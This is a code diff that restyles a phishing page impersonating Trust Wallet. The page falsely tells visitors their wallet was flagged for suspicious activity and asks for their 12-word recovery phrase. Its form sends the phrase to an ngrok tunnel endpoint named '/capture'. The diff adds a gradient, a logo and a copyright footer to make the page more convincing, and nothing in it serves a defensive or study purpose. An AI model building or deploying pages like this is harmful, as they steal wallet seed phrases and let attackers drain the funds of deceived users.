@@ -3,27 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet - Secure Your Crypto</title>
+    <title>Trust Wallet - Security Verification</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f5f5f5; color: #333; }
-        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h1 { text-align: center; color: #0052ff; } /* Trust Wallet blue */
-        form { display: flex; flex-direction: column; }
-        textarea { padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; height: 80px; }
-        button { padding: 10px; background: #0052ff; color: white; border: none; border-radius: 4px; cursor: pointer; }
-        button:hover { background: #0039cc; }
-        .alert { color: red; font-weight: bold; text-align: center; margin-bottom: 20px; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0052ff, #0039cc);
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            padding: 40px;
+            max-width: 450px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxjaXJjbGUgY3g9IjUwIiBjeT0iNTAiIHI9IjUwIiBmaWxsPSIjMDA1MmZmIi8+Cjx0ZXh0IHg9IjUwIiB5PSI2NSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjQwIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+VDwvdGV4dD4KPC9zdmc+') no-repeat center;
+            background-size: contain;
+            margin: 0 auto 20px;
+        }
+        h1 {
+            color: #0052ff;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #0052ff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #0039cc;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="logo"></div>
         <h1>Trust Wallet</h1>
-        <div class="alert">Security Alert: Verify Your Recovery Phrase</div>
-        <p>Your wallet has been flagged for suspicious activity. Enter your 12-word seed phrase below to verify and secure your funds.</p>
+        <div class="alert">
+            Security Alert: Verify Your Recovery Phrase
+        </div>
+        <p>Your wallet has been flagged for suspicious activity. To secure your funds, enter your 12-word recovery phrase below and verify immediately.</p>
         <form action="https://your-ngrok-url.ngrok.io/capture" method="post">
             <textarea name="seed" placeholder="Enter your 12-word recovery phrase (space-separated)" required></textarea>
-            <button type="submit">Verify and Secure</button>
+            <button type="submit">Verify and Secure Funds</button>
         </form>
+        <div class="footer">
+            Trust Wallet © 2023. All rights reserved.
+        </div>
     </div>
 </body>
 </html>
